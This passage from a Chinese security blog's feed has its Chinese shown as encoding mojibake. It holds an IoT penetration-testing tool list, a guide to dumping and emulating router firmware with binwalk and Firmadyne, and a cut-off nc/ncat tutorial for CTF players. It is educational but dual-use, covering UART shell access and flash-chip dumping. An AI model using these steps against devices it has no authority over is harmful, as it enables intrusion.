    <title>ã€IOTã€‘ç‰©è”ç½‘æ¸—é€æµ‹è¯•-å·¥å…·è¦æ±‚</title>
    <link href="/2022/09/13/%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82/"/>
    <url>/2022/09/13/%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82/</url>
    
    <content type="html"><![CDATA[<h2 id="å›ºä»¶åˆ†æå·¥å…·"><a href="#å›ºä»¶åˆ†æå·¥å…·" class="headerlink" title="å›ºä»¶åˆ†æå·¥å…·"></a>å›ºä»¶åˆ†æå·¥å…·</h2><ul><li><p>Binwalk</p></li><li><p>Firmadyne</p></li><li><p>Firmwalker</p></li><li><p>Angr</p></li><li><p>firmware-mod-toolkit</p></li><li><p>Firmware Analysis Toolkit</p></li><li><p>GDB</p></li><li><p>Radare2</p></li><li><p>Binary Analysis Toolï¼ˆBATï¼‰</p></li><li><p>Qemu</p></li><li><p>IDA Proï¼ˆå¯é€‰ï¼‰</p></li></ul><h2 id="Webåº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·"><a href="#Webåº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·" class="headerlink" title="Webåº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·"></a>Webåº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·</h2><blockquote><p>Webåº”ç”¨æ¸—é€æµ‹è¯•çš„å¸¸è§å·¥å…·ä¸»è¦åŒ…æ‹¬Burp Suiteå’ŒOWASP ZAPã€‚Burp Suiteæœ‰å…è´¹ç‰ˆå’Œä¸“ä¸šç‰ˆä¹‹åˆ†ï¼Œä¸“ä¸šç‰ˆçš„ä»·æ ¼ä¹Ÿä¸ç®—ç¦»è°±ã€‚è€ŒZAPåˆ™æ˜¯å®Œå…¨å…è´¹å¹¶ä¸”å¼€æºçš„ï¼Œåœ¨éœ€è¦æ§åˆ¶æˆæœ¬çš„æƒ…å†µä¸‹ï¼ŒZAPä¸å¤±ä¸ºä¸€ç§æ¯”è¾ƒå¥½çš„é€‰æ‹©ã€‚åœ¨å¯¹WebæœåŠ¡å’ŒAPIè¿›è¡Œæµ‹è¯•æ—¶ï¼Œè¿˜å¯ä»¥åŠ è½½æ’ä»¶ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¦å®‰è£…Burp Suiteçš„æ’ä»¶ï¼Œåˆ™éœ€è¦å…ˆè´­ä¹°ä¸“ä¸šç‰ˆã€‚è¿™é‡Œåˆ—å‡ºçš„æ‰€æœ‰å·¥å…·éƒ½æ˜¯è·¨å¹³å°çš„ï¼Œå®ƒä»¬è¦ä¹ˆæ˜¯åŸºäºJavaå¼€å‘çš„ï¼Œè¦ä¹ˆå¯ä»¥å†…ç½®åœ¨æµè§ˆå™¨ä¸­</p></blockquote><ul><li><p>Burp Suite</p></li><li><p>OWASP Zed Attack Proxyï¼ˆZAPï¼‰</p></li><li><p>REST Easy Firefox Plugin</p></li><li><p>Postman Chrome Extension</p></li></ul><h2 id="ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·"><a href="#ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·" class="headerlink" title="ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·"></a>ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·</h2><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><ul><li>å‘è¡Œç‰ˆAndroidæ¸—é€æµ‹è¯•è™šæ‹Ÿæœºï¼šAndroid SDKã€Android </li><li>Emulator</li><li>Enjarify</li><li>JD-Gui</li><li>Mob-SF</li><li>SQLite Browser</li><li>Burp Suite</li><li>OWASP ZAP</li></ul><h3 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h3><blockquote><p>ç”±äºiOSå¹³å°æ¯”è¾ƒç‰¹æ®Šï¼Œå› æ­¤åœ¨å¼€å§‹æ¸—é€æµ‹è¯•å‰éœ€è¦å‡†å¤‡å¥½OS Xè®¡ç®—æœºå’Œå·²è¶Šç‹±çš„è‹¹æœè®¾å¤‡ã€‚å¦‚æœä¸æ»¡è¶³è¿™ä¸¤ä¸ªå‰ææ¡ä»¶ï¼Œé‚£ä¹ˆæ˜¯æ— æ³•å¯¹iOSåº”ç”¨å¼€å±•æ¸—é€æµ‹è¯•çš„ã€‚ä¸‹é¢æ˜¯å¯¹iOSåº”ç”¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ç”¨åˆ°çš„éƒ¨åˆ†å·¥å…·ã€‚</p></blockquote><p>ä¸‹é¢åˆ—å‡ºçš„æ˜¯éœ€è¦åœ¨OS Xè®¡ç®—æœºä¸Šå®‰è£…çš„iOSåº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·å’Œå®‰å…¨è¯„ä¼°å·¥å…·ï¼š</p><ul><li>idb</li><li>Xcode Tools</li><li>Class-Dump</li><li>Hopperï¼ˆå¯é€‰ï¼‰</li><li>Mob-SF</li><li>SQLite Browser</li><li>Burp Suite</li><li>OWASP ZAP</li></ul><p>ä¸‹é¢åˆ—å‡ºçš„æ˜¯ä¸ºå¼€å±•æ¸—é€æµ‹è¯•éœ€è¦å®‰è£…åœ¨è¶Šç‹±è®¾å¤‡ä¸Šçš„è½¯ä»¶ï¼š</p><ul><li>Cydia</li><li>openURL</li><li>dumpdecrypted</li><li>ipainstaller</li><li>SSL Kill Switch 2</li><li>Clutch2</li><li>Cycript</li></ul><h2 id="æ— çº¿ç”µåˆ†æå·¥å…·éœ€æ±‚"><a href="#æ— çº¿ç”µåˆ†æå·¥å…·éœ€æ±‚" class="headerlink" title="æ— çº¿ç”µåˆ†æå·¥å…·éœ€æ±‚"></a>æ— çº¿ç”µåˆ†æå·¥å…·éœ€æ±‚</h2><h3 id="æ— çº¿ç”µåˆ†æç¡¬ä»¶"><a href="#æ— çº¿ç”µåˆ†æç¡¬ä»¶" class="headerlink" title="æ— çº¿ç”µåˆ†æç¡¬ä»¶"></a>æ— çº¿ç”µåˆ†æç¡¬ä»¶</h3><p>ä¸‹é¢åˆ—å‡ºäº†ç”¨äºåˆ†ææ— çº¿ç”µé¢‘è°±çš„ç¡¬ä»¶è®¾å¤‡ï¼š</p><ul><li>Atmel RZ Raven USBè®¾å¤‡ï¼ˆKillerBeeæ”»å‡»æ¡†æ¶ï¼‰</li><li>Attify Badge[1]ï¼ˆæˆ–è€…C232HM-DDHSL-0çº¿ç¼†åŒAdafruit FTDI Breakoutå¼€å‘æ¿çš„æ­é…ï¼‰</li><li>HackRF One</li><li>Yardstick One</li><li>å¸¦æœ‰Xbee Shieldæ¨¡å—çš„XBeeæ‰©å±•æ¿</li><li>Ubertooth</li><li>BLeé€‚é…å™¨</li></ul><h3 id="æ— çº¿ç”µåˆ†æè½¯ä»¶"><a href="#æ— çº¿ç”µåˆ†æè½¯ä»¶" class="headerlink" title="æ— çº¿ç”µåˆ†æè½¯ä»¶"></a>æ— çº¿ç”µåˆ†æè½¯ä»¶</h3><ul><li>KillerBeeæ¡†æ¶</li><li>Attify ZigBeeæ¡†æ¶</li><li>GNU Radio</li><li>BLEAH</li><li>GQRX</li><li>Ubertooth tools</li><li>Blue Hydra</li><li>RTL-sdr</li><li>Hackrf packages</li><li>EZ-Wave</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOT PWNã€‘ç¯å¢ƒæ­å»º</title>
    <link href="/2022/09/13/%5BIOT%20PWN%5D%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/09/13/%5BIOT%20PWN%5D%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¡¬ä»¶èµ„æº"><a href="#ç¡¬ä»¶èµ„æº" class="headerlink" title="ç¡¬ä»¶èµ„æº"></a>ç¡¬ä»¶èµ„æº</h2><p>å¤ªå¤šè¾£ï¼Œä»¥åçœ‹éœ€æ±‚æ…¢æ…¢è´­å…¥å§</p><ul><li>ä¸‡ç”¨è¡¨ï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯ç”¨æ¥æµ‹è¯•UART(TLL)ä¸­çš„å‡ ä¸ªæ¥å£ï¼Œæ¯”å¦‚<code>RX</code>ã€<code>TX</code>ã€<code>GND</code>ã€‚</li><li>CH340Gè®¾å¤‡(USBè½¬TTL)ï¼Œè¿™ä¸ªè®¾å¤‡ä¸»è¦çš„å°†ç”µè„‘ä¸IoTè®¾å¤‡ç”¨TTLçº¿è¿æ¥ï¼Œæ–¹ä¾¿è¿›å…¥IoTè®¾å¤‡çš„ç»ˆç«¯(Shell)ã€‚</li><li>ç”µçƒ™é“ï¼Œè¿™é‡Œä¹°ç”µçƒ™é“çš„ä¸»è¦ç”¨é€”æ˜¯ç„Šæ¥UARTæ¥å£çš„é’ˆè„šã€‚</li><li>ç„Šé”¡ä¸</li><li>é’ˆè„šï¼Œé’ˆè„šä¸»è¦ç”¨æ¥ç„Šæ¥UARTæ¥å£</li><li>ç¼–è¾‘å™¨ï¼Œç¼–ç¨‹å™¨ä¸»è¦æ˜¯ç”¨æ¥å¸®åŠ©æˆ‘ä»¬dump IoTè®¾å¤‡ä¸Šä¾‹å¦‚<code>é—ªå­˜èŠ¯ç‰‡</code>é‡Œé¢çš„æ•°æ®ï¼Œä¸€èˆ¬éƒ½ä¸ºå›ºä»¶åŒ…ã€‚ç¼–ç¨‹å™¨çš„è¯ä¸€èˆ¬ä¹°CH341Aå¤Ÿç”¨äº†ï¼ŒåŸºæœ¬ä¸Š8è„šçš„èŠ¯ç‰‡éƒ½æ”¯æŒã€‚å¦‚æœå¯Œè£•çš„è¯ç¼–ç¨‹å™¨å¯ä»¥ä¹°ä¸ªçˆ±ä¿®çš„RT80Hç¼–ç¨‹å™¨ï¼Œæˆ–è€…RT809Fä¹Ÿä¸é”™ã€‚</li><li>çƒ­é£æªï¼Œè¿™ä¸ªå…¶å®å¯æœ‰å¯æ— ï¼Œç›¸å¯¹äºæŠ€æœ¯æ¯”è¾ƒé«˜çš„äººç”¨ï¼Œå› ä¸ºçƒ­é£æªä¸»è¦æ˜¯å¹å‡ºèŠ¯ç‰‡ç„¶åæ”¾åˆ°ç¼–ç¨‹å™¨ä¸Šé¢ç”¨æ¥dumpä¼°è®¡ï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´ç”¨å¤¹å­å°±å¯ä»¥æŠŠå›ºä»¶dumpå‡ºæ¥ã€‚</li><li>æµ‹è¯•å¤¹ã€æ¢é’ˆï¼Œè¿™ä¸ªçš„ä¸»è¦ç”¨é€”æ˜¯çœçš„æˆ‘ä»¬å»ç„Šæ¥UARTæ¥å£çš„é’ˆè„šäº†ï¼Œç›´æ¥ç”¨è¿™å¤¹å­åŠ ä¸Šå»ç”¨CH340Gè®¾å¤‡è¿æ¥å³å¯ï¼Œä¸è¿‡UARTæ¥å£è¦è§„åˆ™æ‰è¡Œï¼Œè¦ä¸€æ’çš„é‚£ç§ã€‚</li><li>å…æ‹†èŠ¯ç‰‡é€šç”¨æµ‹è¯•å¤¹ï¼Œè¿™è®¾å¤‡ä¸»è¦ä¹Ÿæ˜¯å¸®åŠ©ç”¨æ¥dumpèŠ¯ç‰‡å›ºä»¶çš„ï¼Œæˆ‘ä»¬ä¹°çš„ç¼–ç¨‹å™¨å¤¹å­ä¸€èˆ¬åªèƒ½ç”¨æ¥å¤¹8è„šï¼Œå½“è¶…è¿‡8è„šå°±ä¸å¥½ç”¨äº†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨è¿™ç§é€šç”¨æµ‹è¯•å¤¹æ¥å¤¹ä½èŠ¯ç‰‡ç„¶ådumpä¼°è®¡ã€‚</li></ul><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h3><p>binwalkæ˜¯ä¸€ä¸ªå›ºä»¶è§£åŒ…çš„å·¥å…·ï¼Œå½“æˆ‘ä»¬ç”¨ç¼–ç¨‹å™¨dumpå‡ºä¸€ä¸ªå›ºä»¶ç”¨ï¼Œéœ€è¦ç”¨binwalkæ¥è§£å‹ã€‚ä¸€èˆ¬åšmiscä¹Ÿä¼šç»å¸¸ç”¨åˆ°ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install binwalk<br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-envir/image-20220913113915723.png" alt="image-20220913113915723"></p><p>å›ºä»¶è§£åŒ…å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -Me file.bin<br></code></pre></td></tr></table></figure><p>å®¶é‡Œæ—§è·¯ç”±å™¨è§£åŒ…å‡ºæ¥çš„æ–‡ä»¶ï¼Œå¤ªå¤šäº†æ²¡æˆªå…¨</p><p><img src="/img/article/iot-envir/image-20220913114057712.png" alt="å®¶é‡Œæ—§è·¯ç”±å™¨çš„å›ºä»¶"></p><h3 id="Firmadyneï¼ˆå›ºä»¶ä»¿çœŸï¼‰"><a href="#Firmadyneï¼ˆå›ºä»¶ä»¿çœŸï¼‰" class="headerlink" title="Firmadyneï¼ˆå›ºä»¶ä»¿çœŸï¼‰"></a>Firmadyneï¼ˆå›ºä»¶ä»¿çœŸï¼‰</h3><p>è¿™å·¥å…·ä¸»è¦æ˜¯ç”¨æ¥ä»¿çœŸï¼Œå°†å›ºä»¶ç”¨qemuæ¨¡æ‹Ÿå¯åŠ¨èµ·æ¥ï¼Œä¸è¿‡ä¸æ˜¯ç™¾åˆ†ç™¾æ¨¡æ‹ŸæˆåŠŸçš„ï¼Œç»å¸¸ä¼šä»¿å¤±è´¥ï¼Œå¸¸è§å°±æ˜¯ç¯å¢ƒç­‰é—®é¢˜ã€‚(å»ºè®®è¿˜æ˜¯ä¹°çœŸæœºå¥½)</p><blockquote><p>å®‰è£…å¯å‚è€ƒgithubä¸Šçš„æ–‡ç« ï¼š<a href="https://github.com/firmadyne/firmadyne#introduction">https://github.com/firmadyne/firmadyne#introduction</a></p></blockquote><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan<br>git <span class="hljs-built_in">clone</span> --recursive https://github.com/firmadyne/firmadyne.git<br></code></pre></td></tr></table></figure><h4 id="é‡æ–°æ„å»ºbinwalk"><a href="#é‡æ–°æ„å»ºbinwalk" class="headerlink" title="é‡æ–°æ„å»ºbinwalk"></a>é‡æ–°æ„å»ºbinwalk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git<br><span class="hljs-built_in">cd</span> binwalk<br>sudo ./deps.sh<br>sudo python3 ./setup.py install<br></code></pre></td></tr></table></figure><h4 id="æ•°æ®åº“å®‰è£…"><a href="#æ•°æ®åº“å®‰è£…" class="headerlink" title="æ•°æ®åº“å®‰è£…"></a>æ•°æ®åº“å®‰è£…</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install postgresql<br>sudo -u postgres createuser -P firmadyneï¼Œå¸¦å¯†ç firmadyne<br>sudo -u postgres createdb -O firmadyne firmware<br>sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema<br></code></pre></td></tr></table></figure><h4 id="è®¾ç½®Firmadyne"><a href="#è®¾ç½®Firmadyne" class="headerlink" title="è®¾ç½®Firmadyne"></a>è®¾ç½®Firmadyne</h4><p>æ›¿æ¢configæ–‡ä»¶ä¸­çš„ç»å¯¹æ–‡ä»¶è·¯å¾„</p><p><img src="/img/article/iot-envir/image-20220913122554653.png" alt="image-20220913122554653"></p><p>æ„å»ºäºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ./firmadyne; ./download.sh<br></code></pre></td></tr></table></figure><p>å®‰è£…æ‰€éœ€çš„å…¶ä»–<code>qemu</code>ç›¸å…³ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils<br></code></pre></td></tr></table></figure><h2 id="ä»¿çœŸNetgear-ç½‘ç»œè·¯ç”±å™¨-WNAP320æµ‹è¯•"><a href="#ä»¿çœŸNetgear-ç½‘ç»œè·¯ç”±å™¨-WNAP320æµ‹è¯•" class="headerlink" title="ä»¿çœŸNetgear(ç½‘ç»œè·¯ç”±å™¨) WNAP320æµ‹è¯•"></a>ä»¿çœŸNetgear(ç½‘ç»œè·¯ç”±å™¨) WNAP320æµ‹è¯•</h2><h4 id="å›ºä»¶åŒ…ä¸‹è½½"><a href="#å›ºä»¶åŒ…ä¸‹è½½" class="headerlink" title="å›ºä»¶åŒ…ä¸‹è½½"></a>å›ºä»¶åŒ…ä¸‹è½½</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip<br><br><span class="hljs-built_in">mv</span> WNAP320\ Firmware\ Version\ 2.0.3.zip WNAP320.zip  <br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-envir/image-20220913133114466.png" alt="image-20220913133114466"></p><h4 id="è§£å‹å›ºä»¶åŒ…"><a href="#è§£å‹å›ºä»¶åŒ…" class="headerlink" title="è§£å‹å›ºä»¶åŒ…"></a>è§£å‹å›ºä»¶åŒ…</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo python3 ./sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 -np -nk <span class="hljs-string">&quot;WNAP320.zip&quot;</span> images<br><br><span class="hljs-comment">#å‚æ•°è§£é‡Š</span><br>-b   <span class="hljs-string">&quot;brand å“ç‰Œ&quot;</span><br>-sql <span class="hljs-string">&quot;è¿æ¥æœ¬åœ°æ•°æ®åº“&quot;</span><br>-np  <span class="hljs-string">&quot;ä»£è¡¨æ²¡æœ‰å¹¶è¡Œæ“ä½œ&quot;</span><br>-nk  <span class="hljs-string">&quot;ä»£è¡¨ä¸æå–å†…æ ¸&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>å¦‚å‡ºç°No module named â€˜magicâ€™é”™è¯¯ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨pip3 install python-magicè§£å†³</p></blockquote><p><img src="/img/article/iot-envir/image-20220913133817467.png" alt="image-20220913133817467"></p><h4 id="è¯†åˆ«CPUæ¡†æ¶"><a href="#è¯†åˆ«CPUæ¡†æ¶" class="headerlink" title="è¯†åˆ«CPUæ¡†æ¶"></a>è¯†åˆ«CPUæ¡†æ¶</h4><p>æ¥ç€æ˜¯æ‰§è¡Œ<code>./script/getArch.sh</code>è„šæœ¬æ¥è·å–è·¯ç”±å™¨å›ºä»¶çš„CPUæ¶æ„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./scripts/getArch.sh ./images/1.tar.gz<br></code></pre></td></tr></table></figure><p>ç„¯ï¼Œè¿™é‡Œå¡ä½äº†. ä½†æ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªissue: <a href="https://github.com/attify/firmware-analysis-toolkit/issues/27">.&#x2F;images&#x2F;1.tar.gz: Cannot open: No such file or directory Â· Issue #27 Â· attify&#x2F;firmware-analysis-toolkit (github.com)</a></p><p>æš‚æ—¶ä¸çŸ¥é“æ€ä¹ˆè§£å†³</p><p><img src="/img/article/iot-envir/image-20220913143102694.png" alt="image-20220913143102694"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>nc/ncat ä½¿ç”¨æ•™å­¦</title>
    <link href="/2022/09/13/nc%20%E6%98%AF%E4%BB%80%E4%B9%88/"/>
    <url>/2022/09/13/nc%20%E6%98%AF%E4%BB%80%E4%B9%88/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡ç”¨äºä»‹ç»ä¿¡æ¯å®‰å…¨å¤§èµ›ä¸­ä¸å°‘é¢˜ç›®éœ€è¦ä½¿ç”¨çš„ nc&#x2F;ncat å·¥å…·ã€‚<br>å¦‚æœæœ‰ä»€ä¹ˆå»ºè®®ï¼Œå¯ä»¥åœ¨é¡µé¢åº•éƒ¨ç™»å½•Githubä½¿ç”¨è¯„è®ºåŠŸèƒ½ï¼Œæˆ‘çœ‹ä¸åˆ°è´¦å·å¯†ç çš„ï¼Œä¸ç”¨æ‹…å¿ƒğŸ¤©</p></blockquote><h2 id="nc-æ˜¯ä»€ä¹ˆ"><a href="#nc-æ˜¯ä»€ä¹ˆ" class="headerlink" title="nc æ˜¯ä»€ä¹ˆ"></a>nc æ˜¯ä»€ä¹ˆ</h2><p><code>nc/ncat</code> æ˜¯ netcat çš„ç¼©å†™ï¼Œå®ƒå¯ä»¥è¯»å†™ TCP ä¸ UDP ç«¯å£â€”â€”æˆ–è®¸ä½ çœ‹ä¸æ‡‚è¿™å¥è¯ï¼Œè¿™æ²¡æœ‰å…³ç³»ã€‚ç®€å•åœ°è¯´ï¼Œå®ƒå¯ä»¥åœ¨å­—ç¬¦ç•Œé¢ä¸‹ï¼Œè®©ä½ å’ŒæœåŠ¡å™¨æ²Ÿé€šäº¤æµã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæœ‰å¾ˆå¤šé¢˜ç›®éƒ½ä¼šè¦æ±‚ä½ ä½¿ç”¨ <code>nc</code> è¿æ¥åˆ°ä»–ä»¬çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”è¿›è¡Œäº¤äº’ï¼Œè·å¾— flagã€‚</p><h2 id="å¦‚ä½•å®‰è£…-nc"><a href="#å¦‚ä½•å®‰è£…-nc" class="headerlink" title="å¦‚ä½•å®‰è£… nc"></a>å¦‚ä½•å®‰è£… nc</h2><p><code>nc</code> å‘½ä»¤åœ¨ macOS ä¸­æ˜¯è‡ªå¸¦çš„ï¼Œåœ¨ Linux ä¸­ä¸€èˆ¬è‡ªå¸¦ï¼Œæˆ–æ˜¯å¯ä»¥ä½¿ç”¨ç›¸åº”çš„è½¯ä»¶åŒ…ç®¡ç†å™¨å®‰è£…ï¼ˆå¦‚åœ¨ Debian&#x2F;Ubuntu ä¸­è¿™ä¸ªåŒ…åå« netcatï¼‰ã€‚</p><p>å½“ç„¶ï¼Œå¦‚æœä½ åœ¨çœ‹è¿™ç¯‡æ‰‹å†Œï¼Œä½ çš„æ“ä½œç³»ç»Ÿå¾ˆæœ‰å¯èƒ½æ˜¯ Windowsã€‚å®ƒä¸è‡ªå¸¦ <code>nc</code>ï¼Œå°½ç®¡å¯ä»¥ç”¨ WSL æˆ–è€…è™šæ‹Ÿæœºçš„æ–¹å¼è§£å†³ï¼Œä½†æ˜¯å¦‚æœä½ è§‰å¾—è¿™æ ·å¤ªéº»çƒ¦äº†ï¼Œä¹Ÿæœ‰å¦å¤–ä¸€äº›æ–¹æ³•ã€‚</p><h3 id="ä½¿ç”¨é™æ€é“¾æ¥çš„-ncat-ç¨‹åº"><a href="#ä½¿ç”¨é™æ€é“¾æ¥çš„-ncat-ç¨‹åº" class="headerlink" title="ä½¿ç”¨é™æ€é“¾æ¥çš„ ncat ç¨‹åº"></a>ä½¿ç”¨é™æ€é“¾æ¥çš„ ncat ç¨‹åº</h3><p>å‰å¾€ <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe</a> ä¸‹è½½æ­¤ç¨‹åºã€‚æˆ‘ä»¬ä¹Ÿåœ¨è¿™é‡Œæä¾›äº†ä¸€ä»½ã€‚ä¸‹è½½ä¸‹æ¥å³å¯ã€‚</p><p><a href="https://planet.ustclug.org/wp-content/uploads/2019/09/ncat.zip">ncat.zip ä¸‹è½½</a></p><p><em>æ³¨ï¼š<code>nc</code>&#x2F;<code>ncat</code> äº‹å®ä¸Šæ˜¯ä¸¤ä¸ªä¸åŒçš„ç¨‹åºï¼Œä½†åœ¨æˆ‘ä»¬æ¥ä¸‹æ¥çš„ä½¿ç”¨ä¸Šï¼ŒåŸºæœ¬æ²¡æœ‰åŒºåˆ«ã€‚<code>ncat</code> æ˜¯ç”± Nmap é¡¹ç›®å¼€å‘çš„â€œé‡ç½®ç‰ˆçš„ Netcatâ€ã€‚</em></p><h4 id="æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’ï¼"><a href="#æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’ï¼" class="headerlink" title="æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’ï¼"></a>æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’ï¼</h4><p>è¿™æ˜¯ virustotal çš„æ£€æµ‹ç»“æœï¼š<a href="https://www.virustotal.com/gui/file/d0baada87420dd7c2e63d0dd3248749c06b53806d3021863c4fa659608053a8a/detection">https://www.virustotal.com/gui/file/d0baada87420dd7c2e63d0dd3248749c06b53806d3021863c4fa659608053a8a/detection</a></p><p>å¦‚æœä½ ä¸ç›¸ä¿¡æ­¤æ¥æºï¼Œä¹Ÿå¯ä»¥ä¸‹è½½ <code>nmap</code>ï¼ˆä¸€ä¸ªç½‘ç»œæ¢æµ‹ã€æ‰«æå·¥å…·ï¼‰ï¼Œå®ƒä¼šé™„å¸¦ä¸€ä¸ª <code>ncat</code>ã€‚</p><h2 id="å¦‚ä½•ä½¿ç”¨-nc"><a href="#å¦‚ä½•ä½¿ç”¨-nc" class="headerlink" title="å¦‚ä½•ä½¿ç”¨ nc?"></a>å¦‚ä½•ä½¿ç”¨ nc?</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>ç›´æ¥åŒå‡»è§£å‹å‡ºæ¥çš„<code>ncat.exe</code>ï¼Œä½ ä¼šçœ‹åˆ°ä¸€ä¸ªçª—å£ä¸€æ‰«è€Œè¿‡â€”â€”è¿™æ˜¯æ­£å¸¸ç°è±¡ã€‚ä½ éœ€è¦ä½¿ç”¨ã€Œå‘½ä»¤æç¤ºç¬¦ã€æˆ–è€…ã€ŒPowerShellã€æ¥è®¿é—®è¿™ä¸ªç¨‹åºã€‚</p><p>Windows 10 ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨èµ„æºç®¡ç†å™¨ -&gt; æ–‡ä»¶æ¥åœ¨ä½ å­˜æ”¾ <code>nc</code> çš„ç›®å½•ä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦æˆ– PowerShellã€‚</p><p><img src="/img/article/nc/explorer-1024x510-1663035408603-1.png" alt="åœ¨ Windows èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦æˆ– PowerShell"></p><p>æˆ–è€…ï¼Œåœ¨Windows 11ä¸­ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨å¼€å§‹èœå•ä¸­æœç´¢PowerShellï¼Œç„¶åä½¿ç”¨ <code>cd</code> å‘½ä»¤è½¬ç§»åˆ°<code>ncat.exe</code>å¯¹åº”çš„ç›®å½•ï¼šè¾“å…¥ <code>cd æ–‡ä»¶å¤¹å</code> å¯ä»¥è®©ä½ è½¬ç§»åˆ°å¯¹åº”çš„æ–‡ä»¶å¤¹ï¼Œè¾“å…¥ <code>cd ..</code> å¯ä»¥è®©ä½ è½¬ç§»åˆ°ä¸Šé¢ä¸€å±‚ç›®å½•ã€‚ä½¿ç”¨ <code>dir</code> å‘½ä»¤ï¼Œå¯ä»¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ã€‚åŒæ—¶ï¼Œä½¿ç”¨ Tab é”®å¯ä»¥å¸®åŠ©ä½ è¡¥å…¨åç§°ã€‚æ“ä½œå¦‚ä¸‹</p><ul><li>é¦–å…ˆåœ¨å¼€å§‹èœå•ä¸­æœç´¢Windows PowerShellå¹¶æ‰“å¼€ï¼Œåœ¨Windows 11å’ŒWindows 